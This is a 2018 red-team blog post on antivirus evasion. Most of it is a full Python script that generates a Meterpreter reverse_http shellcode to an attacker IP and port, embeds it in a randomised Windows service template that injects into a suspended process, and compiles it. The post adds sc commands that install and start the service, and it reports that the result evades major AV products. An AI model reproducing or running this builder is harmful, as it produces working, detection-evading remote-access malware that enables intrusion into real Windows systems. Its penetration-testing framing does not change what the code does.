---
layout:     post
title:      "Red Team Nightmare (AV Bypass)"
#subtitle:   "RedTeam"
date:       2018-07-17
author:     "Tech"
header-img: "img/post-red-team-penetration-testing.png"
tags:
    - RedTeam
    - Pentesting
    - Programming
    - Linux
---

![](/img/in-post/post-js-version/red-team-nightmare-header.png)

# Red Team Nightmare (AV Bypass)  :
You made your way into an interactive box, where you need to use some privilege escalation techniques to gain system. This isn't a post about the various techniques, but it's about evading the anti-virus for your engagement (From going interactive to active).

The usual top applications would be veil-framework or cobalt-strike. The issue with using this applications out-of-the-box is that they always have the same signature. Cobalt-strike mentions that major anti-virus product likes to write signatures for the executables in Cobalt Strike’s trial each time there is a release.

My goal wasn't to get 0/64 on virustotal, but to bypass the top tier AV providers (Avast, ESET, Malwarebytes, McAfee, Sophos AV) and continue with our engagement.

`With the modifications done below, the service executable gets about **15/64** on virustotal, and also pass all of the top tier providers above.`

### Breakdown:

When you use Veil/Cobalt-Strike/Metaspolit to create your executable, it will first generate a shellcode and than find it's corresponding executable file where the application will inject the shellcode in the 'Payload' memory address of the executable. This 'Payload' memory address allocates a buffer of usually 4096 bytes and starts with the string 'Payload', not really hiding what it is.

From doing numerous testing, I modified the service executable's template to allow for the shellcode to not be 'injected' into the skeletons buffer (as told above), but more of adding it directly to the 'C' file itself.

Moving Forward, by default a buffer of 4096 is automatically set with the heading 'Payload', if your shellcode is less than that (It will be by far), it will than nopsled it's way to the end. AV can set a signature of X amount of A's (nopsled). What I did instead will take the shellcode size, and make that the default buffer space, nops not needed.

##### Quick overview of what I changed:

- Shellcode directly into C file to be compiled.
- No preset  allocate buffer
- Randomized various variables and function names, changes every compile.

### AV_Bypass.py

With all that said, I created a python script that can do the above very seamlessly. It will request an IP and PORT to callback to, make a shellcode, inject it into a set template, and compile the service executable for you all in one go.

The callback can either be a meterpreter shell, or cobalt-strike beacon.

The script is located at my github: [https://github.com/Techryptic/AV_Bypass](https://github.com/Techryptic/AV_Bypass)

##### Prerequisites:
- msfvenom
- i686-w64-mingw32-gcc

#### Windows Side of things:

With the newly created Windows Service Executable, you can create a Windows service on the box with:
```bash
sc create write32 binPath= "C:\-Path to service executable.exe"
```
>The 'write32' would be the process name we create, in this case we'll match the exectuable file.
```bash
sc qc write32
```
>Verify that the we added the service and the right path is listed.
```bash
sc start write32
```
>After the service has started, check back your meterpreter shell or cobalt-strike listerner. SUCCESS!

Just want to make another note that there is a difference between a regular Windows Exectuable and a Windows Service Executable.

- **Windows EXE** is a Windows executable.
- **Windows Service EXE** is a Windows executable that responds to Service Control Manager commands. You may use this executable to create a Windows service with sc or as a custom executable with the Metasploit® Framework's PsExec modules.

---

## Breakdown:
I have attached the script below as a quick reference, I would== highly suggest getting it directly from my github page for the most updated version==. I do have a list of awesome bypass methods I would like to add in the future.

The script is located at my github: [https://github.com/Techryptic/AV_Bypass](https://github.com/Techryptic/AV_Bypass)

```python
#!/usr/bin/env python
# coding: latin-1
import re, os, sys, socket, struct, commands, subprocess, functools, random, string

#---------------#---------#
W  = '\033[0m'  # White   #
G  = '\033[32m' # Green   #
Y  = '\033[33m' # Yellow  #
R  = '\033[91m' # RED     #
#---------------#---------#
ExecutableName = "write32.exe"

if len(sys.argv) is not 3:
    print "Usage: {0} IP PORT".format(sys.argv[0])
    print "IP & PORT can either be for CoboltStike or Meterpreter"
    print "Default Exectuable Name: "+ExecutableName
    exit()
ip = sys.argv[1]
port = sys.argv[2]

header = """
 █████╗ ██╗   ██╗       ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔══██╗██║   ██║       ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
███████║██║   ██║       ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
██╔══██║╚██╗ ██╔╝       ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
██║  ██║ ╚████╔╝███████╗██████╔╝   ██║   ██║     ██║  ██║███████║███████║
╚═╝  ╚═╝  ╚═══╝ ╚══════╝╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝"""
print(header.decode('utf-8'))

try:
    is_present=subprocess.check_output(['which','i686-w64-mingw32-gcc'],stderr=subprocess.STDOUT)
except subprocess.CalledProcessError:
    print(R+"i686-w64-mingw32-gcc"+" is not installed\n"+W)
    exit()
try:
    is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)
except subprocess.CalledProcessError:
    print(R+"msfvenom"+" is not installed\n"+W)
    exit()

print "█ "+G+"Setting up MSFVENOM"+W+"..."+W

msf = commands.getstatusoutput('msfvenom -p windows/meterpreter/reverse_http LHOST='+ip+' LPORT='+port+' -f c > payload.c')
print "█ "+G+"Payload Generated"+W+"..."+W
msf = str(msf)
if 'Payload size' in msf:
	bytes = re.findall(r'Payload size: (.*?) bytes', msf)
	bytes = int(bytes[0]) + 2
print "█ "+G+"Payload Size: "+W+""+str(bytes)+W

payload = commands.getstatusoutput('cat payload.c | grep x')

rand = "".join( [random.choice(string.letters[:26]) for i in xrange(5)] )
randservicename = "".join( [random.choice(string.letters[:26]) for i in xrange(8)] )
randbuff = "".join( [random.choice(string.letters[:26]) for i in xrange(4)] )
randlpPayload = "".join( [random.choice(string.letters[:26]) for i in xrange(9)] )
randdate = "b"+"".join( [random.choice(string.letters[:26]) for i in xrange(4)] )

print "█ "+G+"Injecting Payload"+W+"..."+W
s = """#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define """+randbuff+"""	"""+str(bytes)+"""
char cServiceName[32] = """+"\""+randservicename+"\""+""";
char """+randdate+"""["""+randbuff+"""] = """+payload[1]+"""

SERVICE_STATUS """+rand+""";
SERVICE_STATUS_HANDLE hStatus = NULL;

BOOL ServiceHandler( DWORD dwControl )
{
	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
	{
		"""+rand+""".dwWin32ExitCode = 0;
		"""+rand+""".dwCurrentState  = SERVICE_STOPPED;
	}
	return SetServiceStatus( hStatus, &"""+rand+""" );
}
VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
{
	CONTEXT Context;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID """+randlpPayload+""" = NULL;
	ZeroMemory( &"""+rand+""", sizeof(SERVICE_STATUS) );
	ZeroMemory( &si, sizeof(STARTUPINFO) );
	ZeroMemory( &pi, sizeof(PROCESS_INFORMATION) );
	si.cb = sizeof(STARTUPINFO);
	"""+rand+""".dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	"""+rand+""".dwCurrentState = SERVICE_START_PENDING;
	"""+rand+""".dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
	if ( hStatus )
	{
		"""+rand+""".dwCurrentState = SERVICE_RUNNING;
		SetServiceStatus( hStatus, &"""+rand+""" );
		if( CreateProcess( NULL, """+"\""+ExecutableName+"\""+""", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
		{
			Context.ContextFlags = CONTEXT_FULL;
			GetThreadContext( pi.hThread, &Context );
			"""+randlpPayload+""" = VirtualAllocEx( pi.hProcess, NULL, """+randbuff+""", MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
			if( """+randlpPayload+""" )
			{
				WriteProcessMemory( pi.hProcess, """+randlpPayload+""", &"""+randdate+""", """+randbuff+""", NULL );
#ifdef _WIN64
				Context.Rip = (DWORD64)"""+randlpPayload+""";
#else
				Context.Eip = (DWORD)"""+randlpPayload+""";
#endif
				SetThreadContext( pi.hThread, &Context );
			}
			ResumeThread( pi.hThread );
			CloseHandle( pi.hThread );
			CloseHandle( pi.hProcess );
		}
		ServiceHandler( SERVICE_CONTROL_STOP );
		ExitProcess( 0 );
	}
}
int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{
	SERVICE_TABLE_ENTRY st[] =
    {
        { (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain },
        { NULL, NULL }
    };
	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );
}
"""
print "█ "+G+"Writing to C File"+W+"..."+W
fout = open("wrap.c", "w")
fout.write(s)
fout.close()

print "█ "+G+"Compiling Windows Service Executable..:"+W+" "+ExecutableName+W
os.system("i686-w64-mingw32-gcc wrap.c -o "+ExecutableName)

print "█ "+G+"Cleaning up"+W+"..."+W
os.system("rm wrap.c | rm payload.c")
print "█ "+G+"FINISHED"+W+"..."+W
```

![](/img/in-post/post-js-version/red-team-nightmare-virustotal_results.png)
